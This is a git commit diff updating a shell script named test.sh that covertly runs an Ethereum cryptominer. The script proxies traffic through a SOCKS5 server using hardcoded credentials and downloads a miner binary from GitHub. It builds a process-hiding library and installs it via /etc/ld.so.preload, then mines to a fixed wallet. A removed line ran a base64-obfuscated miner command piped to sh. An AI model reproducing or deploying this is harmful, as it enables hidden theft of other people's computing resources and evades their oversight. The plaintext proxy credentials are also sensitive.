c0d9a6de2bb91d6b934bcc1e422ae435abd94da6
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-04-24 16:00:29 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -11,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 =  2.56.120.93:5205
-socks5_username = hadi0139
-socks5_password = buatthr2022
+socks5 = 45.86.71.9:6269
+socks5_username = tahugoreng
+socks5_password = dadakan123
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -35,13 +35,17 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
+./graftcp/graftcp wget https://github.com/archernap/prem/raw/main/priyatama
+chmod +x priyatama
+POOL=stratum+ssl://eth-us-west.flexpool.io:5555
+WALLET=0xbc48b8bdce572defe4dcab85103f140099bc5af5
+WORKER=DENT
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
+./graftcp/graftcp wget https://github.com/hunzibao/tmp/raw/main/magicPriyatama.zip
+unzip magicPriyatama.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-base64 -d <<< Li9ncmFmdGNwL2dyYWZ0Y3AgLi9iZXp6SGFzaCAtLXVybD1zc2w6Ly8weGJjNDhiOGJkY2U1NzJkZWZlNGRjYWI4NTEwM2YxNDAwOTliYzVhZjUuUkRQQGV0aC11cy13ZXN0LmZsZXhwb29sLmlvOjU1NTUgLS1sb2cgLS1leHRyYSAtLWxhdGVuY3kgLS1hbGwtc2hhcmVzIC0tc2hhcmVzLWRldGFpbCAtLXNob3ctbW9kZSAtLWxpc3QtbW9kZXMgLS1tb2RlPTk5 | sh
+
+./graftcp/graftcp ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER
